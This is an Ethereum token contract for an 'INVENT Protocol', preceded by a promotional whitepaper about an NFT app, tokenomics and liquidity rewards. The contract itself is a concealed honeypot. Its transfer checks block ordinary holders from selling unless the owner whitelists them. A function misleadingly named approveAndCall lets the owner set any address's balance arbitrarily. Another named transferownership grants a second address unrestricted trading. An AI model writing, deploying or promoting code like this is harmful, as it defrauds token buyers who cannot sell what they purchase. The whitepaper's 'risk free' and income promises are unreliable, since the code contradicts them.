/**
 *Submitted for verification at Etherscan.io on 2022-04-05
*/

/*Welcome to the INVENT Protocol
Here you will find all the information regarding the INVENT Protocol and it's progress. The documentation focuses on the token-economics for 
the INVENT Protocol and dives deep into the network's flagship application, INVENT.  You can use the following resources to keep up to date 
with the INVENT Protocol.
MISSION
Our mission is to build an ecosystem of interconnected applications that put power back into the hands of users by giving them full control over 
their content, data, and personal networks. Developers can connect via an API to instantly gain access to millions of users and incentivize them 
to try their product by paying with a token. The INVENT app is the flagship application of this interconnected ecosystem of apps built using AI, 
graph and blockchain technologies. On a path to comply with the strictest privacy and consumer protection laws, we’re creating a solution to 
contemporary cyber security problems by developing a cutting edge privacy solution that’s fit for the 21st century.
Vision
The best recognizable effect, we feel, is when members enter the market and decide to remain. It will be overwhelming for novices to the decentralized 
organic framework. We emphasize cultivating a stage that will construct an emblematic astronauts' adventure experience while additionally giving 
decentralized and passive income features that will entice newcomers to stay, whether as dealers or stage customers. Our foundation intends to
be risk free by providing a secure or trustworthy environment.
STORY
We are building tools that strengthen the collaboration between communities and developers.The resulting synergy will spawn experiential and 
monetization opportunities the likes we have never witnessed. By making trustless (trust-based) monetization tools accessible, and removing 
obstacles to user adoption, INVENT Protocol is accelerating this novel synergy. We believe that personal data should remain in control of those 
it belongs to. Earning revenue from your content, audience or data shouldn’t be an afterthought, it should be a given and a central part of a true 
digital economy. 
Introducing the INVENT App
INVENT is NFT Creator And Marketplace App! INVENT provides an easy and fast way to mint NFTs on various blockchains like Ethereum, Polygon
and Binance Smart Chain! Connect Instagram and create NFTs out of your Instagram pictures! Buy exclusive NFTs in the app marketplace. Create 
your NFTs and sell them on marketplaces like OpenSea, Rarible and SuperRare.
NFT stands for non-fungible token, which basically means that it's a one of a kind digital asset that belongs to you and you only.
It is an easy way to monetize your digital assets and sell them in an evergrowing market. The INVENT App is the first app to run on the INVENT 
Protocol. The INVENT App reward system encourages growth across the App. 
Through the INVENT App members can:
•	Earn INVENT token for using the app regularly and performing challenges.
•	They can transfer INVENT token to other members.
•	INVENT token can, and must, be used to purchase NFTs on the App.
•	These tokens can be used to purchase specific NFT’s on the apps that allow INVENT token 
as a method of payment, purchase exclusive merchandise and digital content by INVENT app, and convert to the main INVENT token.
Tokenomics
The INVENT Protocol’s native token, the INVENT token, will have an capped supply. The finite supply of the INVENT token is 500,000,000 tokens. 
Each dapp on the INVENT Protocol will receive a supply of INVENT token to reward members and handle transaction fees based on how it contributes
to the member, engagement and transaction growth of the Network.
Developer Ecosystem Fund
The first thing the Developer Ecosystem fund will be used for is allowing current users of the INVENT app to design their NFT. With INVENT being 
the flagship application of the network, we believe it is important to reward long-term users of the application that have helped kick start the network. 
The fund will also be used to issue grants to other projects that help push the INVENT Protocol’s long-term utility objectives. Initiatives will be outlined 
though contracts that when achieved, the grant will be issued.
Governance
The INVENT Protocol plans to have its own parachain slot under Ethereum in the future. With that being said, The INVENT Protocol will adopt Ethereum's 
Governance mechanism.In the simplest terms any upgrades to the network that are proposed by either the token holders (public) or the council will 
have to go through a referendum. This allows all holders to have a vote, which is done by the weighted by stake method, to voice how they feel about 
the proposed upgrade/change to the network.
Liquidity Incentivization Program
We at the INVENT Protocol understand the importance of adequate liquidity when launching a token. To encourage contribution to liquidity pools, we 
will allow you to stake INVENT token LP (Liquidity Pool) tokens! The INVENT Protocol has set aside 5% of the INVENT token supply (25,000,000 tokens) 
for rewarding individuals who stake their LP tokens.
Liquidity Incentivization Program.
We will accept LP tokens from liquidity swap pool providers. Rewards will be given out monthly and the program will be active for 2 years. Early contributors
will be rewarded the most as the quantity of tokens given out as rewards will decrease in the future. A full schedule of token rewards will be available in the 
INVENT Protocol documentation soon. Along with the staking rewards given directly from the INVENT Protocol, you may also earn a portion of trading fees. 
For example, on UniSwap, liquidity providers earn a 0.25% fee on all trades proportional to their share of the pool. Fees are added to the pool, accrue in real 
time, and can be claimed by withdrawing your liquidity. When combining trading fees and LP token staking rewards, the total rewards can be very enticing.*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}

contract INVENTProtocol {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
       if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}